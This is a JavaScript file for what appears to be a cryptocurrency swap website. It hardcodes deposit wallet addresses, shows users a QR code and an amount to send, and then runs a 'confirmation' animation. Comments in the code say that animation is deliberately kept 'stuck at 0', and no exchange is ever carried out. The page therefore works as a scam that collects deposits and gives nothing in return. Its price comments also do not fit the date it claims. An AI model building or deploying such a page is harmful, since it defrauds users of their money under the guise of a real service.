// Crypto prices and data (Updated December 2024)
const prices = {
    BTC: 118600,  // ~$118,600
    ETH: 3700,    // ~$3,700
    SOL: 203,     // ~$203
    USDT: 1,      // $1 (stablecoin)
    USDC: 1,      // $1 (stablecoin)
    LTC: 116      // ~$116
};

const addresses = {
    SOL: '7cXAmVBEVJcwPCj37zakcfc7xinfn459spkvgHKHrEeY',
    ETH: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877',
    BTC: 'bc1qkvzrkcvn67zj5xaxa4klwdr0gc69dddp2786g7',
    USDT: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877', // Same as ETH for USDT
    USDC: '0xEa882b5cD62173A2Fd2C1F71b4E310983568fae3',
    LTC: 'LhLP7GWPo9UMB6xxi8hyenUNvN7mmr2cLk'
};

// Crypto emoji mapping
const cryptoEmojis = {
    BTC: '₿',
    ETH: 'Ξ',
    SOL: '◎',
    USDT: '₮',
    USDC: '$',
    LTC: 'Ł'
};

// Current selections
let sendCrypto = 'BTC';
let getCrypto = 'ETH';

// Calculate exchange amounts
function calculate() {
    // Get all elements
    const sendUSDInput = document.getElementById('sendUSD');
    const getUSDInput = document.getElementById('getUSD');
    const sendCryptoSpan = document.getElementById('sendCrypto');
    const getCryptoSpan = document.getElementById('getCrypto');
    const sendCodeSpan = document.getElementById('sendCryptoCode');
    const getCodeSpan = document.getElementById('getCryptoCode');
    const sendEmojiSpan = document.getElementById('sendCryptoEmoji');
    const getEmojiSpan = document.getElementById('getCryptoEmoji');
    const exchangeRateSpan = document.querySelector('.exchange-rate span');
    const btnAmount = document.querySelector('.btn-amount');
    
    // Get USD amount being sent
    const sendUSDAmount = parseFloat(sendUSDInput?.value) || 0;
    
    // Validate prices exist
    if (!prices[sendCrypto] || !prices[getCrypto]) {
        return;
    }
    
    // Calculate amounts
    const fee = 0.005; // 0.5% fee
    const receiveUSDAmount = sendUSDAmount * (1 - fee);
    
    // Calculate crypto amounts based on USD values and prices
    const sendCryptoAmount = sendUSDAmount / prices[sendCrypto];
    const receiveCryptoAmount = receiveUSDAmount / prices[getCrypto];
    
    // Update all displays
    if (getUSDInput) getUSDInput.value = receiveUSDAmount.toFixed(2);
    if (sendCryptoSpan) sendCryptoSpan.textContent = sendCryptoAmount.toFixed(8);
    if (getCryptoSpan) getCryptoSpan.textContent = receiveCryptoAmount.toFixed(8);
    
    // Update crypto codes
    if (sendCodeSpan) sendCodeSpan.textContent = sendCrypto;
    if (getCodeSpan) getCodeSpan.textContent = getCrypto;
    
    // Update crypto emojis
    if (sendEmojiSpan) sendEmojiSpan.textContent = cryptoEmojis[sendCrypto] || '?';
    if (getEmojiSpan) getEmojiSpan.textContent = cryptoEmojis[getCrypto] || '?';
    
    // Update exchange rate
    if (exchangeRateSpan) {
        const rate = prices[sendCrypto] / prices[getCrypto];
        exchangeRateSpan.textContent = `Estimated rate: 1 ${sendCrypto} ≈ ${rate.toFixed(6)} ${getCrypto}`;
        

    }
    
    // Update button
    if (btnAmount) {
        btnAmount.textContent = `$${sendUSDAmount.toFixed(2)} → $${receiveUSDAmount.toFixed(2)}`;
    }
}

// Show exchange popup
function showExchange() {
    const popup = document.getElementById('paymentPopup');
    if (!popup) return;
    
    // Calculate values
    const sendUSD = document.getElementById('sendUSD');
    const usdValue = parseFloat(sendUSD.value) || 0;
    const sendAmount = usdValue / prices[sendCrypto];
    
    // Update popup - they need to send the TOP crypto (sendCrypto)
    document.getElementById('cryptoToSend').textContent = sendCrypto;
    document.getElementById('amountToSend').textContent = sendAmount.toFixed(8);
    document.getElementById('cryptoCode').textContent = sendCrypto;
    document.getElementById('usdValue').textContent = usdValue.toFixed(2);
    document.getElementById('depositAddress').textContent = addresses[sendCrypto] || 'No address';
    
    // Update QR with the address for the TOP crypto
    const qr = document.querySelector('.qr-code img');
    if (qr && addresses[sendCrypto]) {
        qr.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${addresses[sendCrypto]}&bgcolor=FFFFFF&color=000000&margin=0`;
    }
    
    popup.style.display = 'flex';
    
    // Start confirmation animation after 2 seconds
    setTimeout(function() {
        startConfirmationProgress();
    }, 2000);
}

// Confirmation progress animation - stuck at 0
function startConfirmationProgress() {
    // Just show the loading state, don't activate any confirmations
    // This keeps it stuck at 0 confirmations
    const confirmationState = document.getElementById('confirmationState');
    if (confirmationState) {
        confirmationState.style.display = 'block';
    }
    
    // Optional: You could add a pulsing effect to the first circle to show it's "waiting"
    const conf1 = document.querySelector('#conf1 .progress-circle');
    if (conf1) {
        // Add a subtle animation to show it's waiting for first confirmation
        conf1.style.animation = 'pulse 2s ease-in-out infinite';
    }
}

// Close payment popup
function closePaymentPopup() {
    const popup = document.getElementById('paymentPopup');
    if (popup) popup.style.display = 'none';
}

// Copy address
function copyAddress() {
    const address = document.getElementById('depositAddress').textContent;
    navigator.clipboard.writeText(address).then(() => {
        event.target.textContent = 'Copied!';
        setTimeout(() => {
            event.target.textContent = 'Copy';
        }, 2000);
    });
}

// Simple crypto selector
function selectCrypto(type) {
    const modal = document.getElementById('cryptoModal');
    if (modal) {
        modal.style.display = 'block';
        modal.setAttribute('data-selecting', type);
    }
}

// When page loads
document.addEventListener('DOMContentLoaded', function() {
    // USD input
    const sendUSD = document.getElementById('sendUSD');
    if (sendUSD) {
        sendUSD.addEventListener('input', calculate);
    }
    
    // Exchange button
    const exchangeBtn = document.getElementById('exchangeBtn');
    if (exchangeBtn) {
        exchangeBtn.addEventListener('click', showExchange);
    }
    
    // Close popup
    const closeBtn = document.getElementById('closePopup');
    if (closeBtn) {
        closeBtn.addEventListener('click', closePaymentPopup);
    }
    
    // Cookie accept
    const acceptBtn = document.querySelector('.accept-btn');
    if (acceptBtn) {
        acceptBtn.addEventListener('click', function() {
            const notice = document.querySelector('.cookie-notice');
            if (notice) notice.style.display = 'none';
        });
    }
    
    // Risk info
    const riskBtn = document.getElementById('riskInfoBtn');
    if (riskBtn) {
        riskBtn.addEventListener('click', function() {
            const modal = document.getElementById('riskModal');
            if (modal) modal.style.display = 'block';
        });
    }
    
    // Close risk modal
    const closeRisk = document.getElementById('closeModal');
    if (closeRisk) {
        closeRisk.addEventListener('click', function() {
            const modal = document.getElementById('riskModal');
            if (modal) modal.style.display = 'none';
        });
    }
    
    const understandBtn = document.getElementById('understandBtn');
    if (understandBtn) {
        understandBtn.addEventListener('click', function() {
            const modal = document.getElementById('riskModal');
            if (modal) modal.style.display = 'none';
        });
    }
    
    // Crypto selectors
    const sendCryptoBox = document.getElementById('sendCryptoDisplay');
    if (sendCryptoBox) {
        sendCryptoBox.addEventListener('click', function() {
            selectCrypto('send');
        });
    }
    
    const getCryptoBox = document.getElementById('getCryptoDisplay');
    if (getCryptoBox) {
        getCryptoBox.addEventListener('click', function() {
            selectCrypto('get');
        });
    }
    
    // Close crypto modal
    const closeCrypto = document.getElementById('closeCryptoModal');
    if (closeCrypto) {
        closeCrypto.addEventListener('click', function() {
            const modal = document.getElementById('cryptoModal');
            if (modal) modal.style.display = 'none';
        });
    }
    
    // Crypto selection
    const cryptoItems = document.querySelectorAll('.crypto-item');
    cryptoItems.forEach(item => {
        item.addEventListener('click', function() {
            const crypto = this.getAttribute('data-crypto');
            const modal = document.getElementById('cryptoModal');
            const selecting = modal.getAttribute('data-selecting');
            
            if (selecting === 'send') {
                sendCrypto = crypto;
                document.getElementById('sendCryptoCode').textContent = crypto;
                document.getElementById('sendCryptoEmoji').textContent = cryptoEmojis[crypto] || '?';
            } else {
                getCrypto = crypto;
                document.getElementById('getCryptoCode').textContent = crypto;
                document.getElementById('getCryptoEmoji').textContent = cryptoEmojis[crypto] || '?';
            }
            
            modal.style.display = 'none';
            calculate();
        });
    });
    
    // Set initial crypto selections to match HTML
    sendCrypto = 'BTC';
    getCrypto = 'ETH';
    
    // Update initial display
    const sendCodeEl = document.getElementById('sendCryptoCode');
    const sendEmojiEl = document.getElementById('sendCryptoEmoji');
    const getCodeEl = document.getElementById('getCryptoCode');
    const getEmojiEl = document.getElementById('getCryptoEmoji');
    
    if (sendCodeEl) sendCodeEl.textContent = sendCrypto;
    if (sendEmojiEl) sendEmojiEl.textContent = cryptoEmojis[sendCrypto] || '?';
    if (getCodeEl) getCodeEl.textContent = getCrypto;
    if (getEmojiEl) getEmojiEl.textContent = cryptoEmojis[getCrypto] || '?';
    
    // Initial calculation
    calculate();
    
    // Refresh button
    const refreshBtn = document.querySelector('.refresh-btn');
    if (refreshBtn) {
        refreshBtn.addEventListener('click', function() {
            calculate();
        });
    }
});